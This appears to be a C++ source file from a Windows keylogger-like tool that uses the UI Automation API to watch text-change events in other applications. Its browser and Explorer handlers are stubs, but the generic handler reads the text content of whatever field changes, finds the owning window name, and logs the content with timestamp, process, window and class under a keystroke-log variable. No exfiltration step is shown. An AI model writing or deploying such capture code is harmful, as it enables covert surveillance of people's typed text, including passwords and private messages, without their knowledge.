#include "MyAutomationEventHandlerApps.h"
#include "MyAutomationEventHandler.h"
#include "Logger.h"
#include "MyTreeWalker.h"

void MyAutomationEventHandler::HandleFirefox(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsEventString, const std::wstring& wsDate, EVENTID eventID)
{
	Log(L"HandleFirefox() Invoked", DBG);
	Log(L"Todo :))", INFO);
}

void MyAutomationEventHandler::HandleChrome(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsEventString, const std::wstring& wsDate, EVENTID eventID)
{
	Log(L"HandleChrome() Invoked", DBG);
	Log(L"Todo :))", INFO);
}

void MyAutomationEventHandler::HandleExplorer(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsEventString, const std::wstring& wsDate, EVENTID eventID)
{
	Log(L"HandleExplorer() Invoked", DBG);
	Log(L"Todo :))", INFO);
}

void MyAutomationEventHandler::HandleOther(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsEventString, const std::wstring& wsDate, EVENTID eventID)
{
	Log(L"HandleOther() Invoked", DBG);

	BSTR bWindowName = NULL;
	BSTR bClassName = NULL;
	
	DWORD size = 0;
	HRESULT hr = ERROR_SUCCESS;

	VARIANT vValue;
	VARIANT vHelp;
	VariantInit(&vValue);
	VariantInit(&vHelp);

	CComPtr<IUIAutomationElement> pAutomationElementChild = pAutomationElement;
	CComPtr<IUIAutomationElement> pAutomationElementParent = NULL;

	std::wstring wsLogKeyStroke = wsDate + L" " + wsProcName + L" [" + wsEventString + L"]";

	switch (eventID)
	{
	case UIA_Text_TextSelectionChangedEventId:
	case UIA_Text_TextChangedEventId:

		hr = pAutomationElement->get_CurrentName(&bWindowName);
		if (SUCCEEDED(hr) && SysStringLen(bWindowName) == 0)
		{
			while (true) {
				pAutomationElementParent = g_pMyTreeWalker->GetParent(pAutomationElementChild);
				if (!pAutomationElementParent)
				{
					Log(L"Can't find parent element", DBG);
					break;
				}

				hr = pAutomationElementParent->get_CurrentName(&bWindowName);
				if (FAILED(hr))
				{
					Log(L"Failed to get parent name", DBG);
					break;
				}

				if (SysStringLen(bWindowName) != 0)
				{
					break;
				}

				pAutomationElementChild = pAutomationElementParent;
			}
		}

		hr = pAutomationElement->get_CurrentClassName(&bClassName);
		if (FAILED(hr))
		{
			Log(L"Can't get current class name", DBG);
		}

		hr = pAutomationElement->GetCurrentPropertyValue(UIA_LegacyIAccessibleHelpPropertyId, &vHelp);
		if (FAILED(hr))
		{
			Log(L"Can't get help property value", DBG);
		}
		
		hr = pAutomationElement->GetCurrentPropertyValue(UIA_ValueValuePropertyId, &vValue);
		if (FAILED(hr))
		{
			Log(L"Can't get property value", WARNING);
		}

		if (std::wstring(vValue.bstrVal) == oldTextValue)
		{
			break;
		}

		wsLogKeyStroke += L"\n\tWindow: " + std::wstring(bWindowName);
		wsLogKeyStroke += L"\n\tClass: " + std::wstring(bClassName);
		wsLogKeyStroke += L"\n\tHelp: " + std::wstring(vHelp.bstrVal);
		wsLogKeyStroke += L"\n--------------[CONTENT]--------------\n" + std::wstring(vValue.bstrVal) + L"\n--------------[CONTENT]--------------";

		oldTextValue = std::wstring(vValue.bstrVal);
		Log(wsLogKeyStroke, EMPTY);
		break;

	case UIA_Invoke_InvokedEventId:
		break;
	
	case UIA_Window_WindowOpenedEventId:
		break;

	default:
		Log(L"Arrived unknown event. How to process that? :)" + wsEventString, INFO);
	}


	SysFreeString(bWindowName);
	SysFreeString(bClassName);
	VariantClear(&vHelp);
	VariantClear(&vValue);
}